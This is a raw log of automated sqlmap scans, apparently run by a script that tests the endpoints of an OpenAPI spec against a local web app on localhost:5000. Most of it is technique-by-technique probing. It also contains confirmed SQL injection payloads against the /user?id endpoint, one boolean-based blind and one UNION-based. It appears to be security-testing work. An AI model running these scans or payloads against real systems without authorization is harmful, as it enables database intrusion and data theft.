[19:04:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:04:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:05:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:05:00] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:05:01] [INFO] testing 'Generic inline queries'
[19:05:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:05:01] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:05:02] [WARNING] parameter 'Referer' does not seem to be injectable
[19:05:02] [INFO] testing if parameter 'Host' is dynamic
[19:05:02] [WARNING] parameter 'Host' does not appear to be dynamic
[19:05:02] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[19:05:02] [INFO] testing for SQL injection on parameter 'Host'
[19:05:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:05:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:05:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:05:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:05:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:05:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:05:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:05:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:05:05] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:05:05] [INFO] testing 'Generic inline queries'
[19:05:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:05:06] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:05:06] [WARNING] parameter 'Host' does not seem to be injectable
[19:05:06] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:05:06] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3455 times, 404 (Not Found) - 4 times

[*] ending @ 19:05:06 /2025-09-26/

2025-09-26 19:05:07,212 - WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Get_reviews_for_a_product_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/login --data 'username=test&password=test'
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:12 /2025-09-26/
INFO - [20:14:14] [INFO] flushing session file
INFO - [20:14:14] [INFO] testing connection to the target URL
INFO - [20:14:14] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
INFO - [20:14:14] [WARNING] HTTP error codes detected during run:
INFO - 401 (Unauthorized) - 1 times
INFO - [*] ending @ 20:14:14 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/login (log: attack-logs-dynamic\User_Login_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/login --output-dir 'attack-logs-dynamic\User_Login_sqlmap' --batch --level=5 --risk=3 --threads 5 --data 'username=test&password=test' --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:18 /2025-09-26/
INFO - [20:14:20] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\User_Login_sqlmap' as the output directory
INFO - [20:14:20] [INFO] testing connection to the target URL
INFO - [20:14:20] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
INFO - [20:14:20] [WARNING] HTTP error codes detected during run:
INFO - 401 (Unauthorized) - 1 times
INFO - [*] ending @ 20:14:20 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/login
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/user
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:24 /2025-09-26/
INFO - [20:14:26] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:14:26] [INFO] testing connection to the target URL
INFO - [20:14:26] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:14:26] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:14:26] [INFO] testing if the target URL content is stable
INFO - [20:14:27] [INFO] target URL content is stable
INFO - [20:14:27] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:14:27] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:14:27] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:14:27] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:14:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:14:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:14:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:14:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:14:27] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:14:27] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:14:27] [INFO] testing 'Generic inline queries'
INFO - [20:14:27] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:14:27] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:14:27] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:14:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:14:27] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:14:27] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:14:27] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:14:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:14:28] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:14:28] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:14:28] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 3 times, 404 (Not Found) - 73 times
INFO - [*] ending @ 20:14:28 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/user (log: attack-logs-dynamic\Get_User_by_ID_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/user?id=test' --output-dir 'attack-logs-dynamic\Get_User_by_ID_sqlmap' --batch --level=5 --risk=3 --threads 5 -p id --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:31 /2025-09-26/
INFO - [20:14:33] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap' as the output directory
INFO - [20:14:33] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:14:33] [INFO] testing connection to the target URL
INFO - [20:14:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: id (GET)
INFO -     Type: boolean-based blind
INFO -     Title: OR boolean-based blind - WHERE or HAVING clause
INFO -     Payload: id=-3862 OR 5105=5105
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (random number) - 3 columns
INFO -     Payload: id=-8835 UNION ALL SELECT 4128,CHAR(113,113,118,118,113)||CHAR(74,120,65,87,71,113,70,101,74,70,117,65,83,73,65,73,113,88,68,98,67,98,90,113,65,80,122,77,68,65,119,121,83,115,106,66,107,67,104,77)||CHAR(113,107,112,120,113),4128-- WSzk
INFO - ---
INFO - [20:14:33] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:14:33] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 1 times
INFO - [20:14:33] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap\localhost'
INFO - [*] ending @ 20:14:33 /2025-09-26/
WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Get_User_by_ID_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/user?id=test' --output-dir 'attack-logs-dynamic\Get_User_by_ID_sqlmap' --batch --level=5 --risk=3 --threads 5 -p id --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:37 /2025-09-26/
INFO - [20:14:39] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap' as the output directory
INFO - [20:14:39] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:14:39] [INFO] testing connection to the target URL
INFO - [20:14:39] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: id (GET)
INFO -     Type: boolean-based blind
INFO -     Title: OR boolean-based blind - WHERE or HAVING clause
INFO -     Payload: id=-3862 OR 5105=5105
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (random number) - 3 columns
INFO -     Payload: id=-8835 UNION ALL SELECT 4128,CHAR(113,113,118,118,113)||CHAR(74,120,65,87,71,113,70,101,74,70,117,65,83,73,65,73,113,88,68,98,67,98,90,113,65,80,122,77,68,65,119,121,83,115,106,66,107,67,104,77)||CHAR(113,107,112,120,113),4128-- WSzk
INFO - ---
INFO - [20:14:39] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:14:39] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
INFO - [20:14:39] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 1 times
INFO - [20:14:39] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID_sqlmap\localhost'
INFO - [*] ending @ 20:14:39 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Get_User_by_ID_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/api/user/1
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:43 /2025-09-26/
INFO - [20:14:46] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:14:46] [INFO] flushing session file
INFO - [20:14:46] [INFO] testing connection to the target URL
INFO - [20:14:46] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:14:46] [INFO] testing if the target URL content is stable
INFO - [20:14:46] [INFO] target URL content is stable
INFO - [20:14:46] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:14:46] [WARNING] URI parameter '#1*' does not appear to be dynamic
INFO - [20:14:46] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:14:46] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:14:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:14:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:14:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:14:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:14:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:14:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:14:47] [INFO] testing 'Generic inline queries'
INFO - [20:14:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:14:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:14:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:14:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:14:47] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:14:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:14:47] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:14:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:14:47] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:14:47] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:14:47] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 73 times
INFO - [*] ending @ 20:14:47 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/api/user/1 (log: attack-logs-dynamic\Get_User_by_ID__API__flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/api/user/1 --output-dir 'attack-logs-dynamic\Get_User_by_ID__API__sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:14:51 /2025-09-26/
INFO - [20:14:53] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_User_by_ID__API__sqlmap' as the output directory
INFO - [20:14:54] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:14:54] [INFO] testing connection to the target URL
INFO - [20:14:54] [INFO] testing if the target URL content is stable
INFO - [20:14:54] [INFO] target URL content is stable
INFO - [20:14:54] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:14:54] [WARNING] URI parameter '#1*' does not appear to be dynamic
INFO - [20:14:54] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:14:54] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:14:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:14:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:14:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:14:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:14:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:14:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:14:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:14:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:14:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:14:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:14:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:15:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:15:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:02] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:03] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:07] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:15:08] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:15:09] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:15:10] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:15:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:15:11] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:15:11] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:15:11] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:15:11] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:15:11] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:15:11] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:15:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:15:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:15:11] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:15:11] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:15:11] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:15:11] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:15:11] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:15:11] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:15:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:15:11] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:15:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:15:11] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:15:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:15:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:15:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:15:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:15:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:15:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:15:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:15:13] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:15:13] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:15:14] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:15:14] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:15:15] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:15:15] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:15:16] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:15:16] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:15:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:15:17] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:15:17] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:15:18] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:15:18] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:15:18] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:15:18] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:15:18] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:15:18] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:15:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:15:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:15:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:15:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:15:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:15:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:15:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:15:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:15:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:15:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:15:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:15:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:15:22] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:15:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:15:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:15:25] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:25] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:15:26] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:26] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:15:27] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
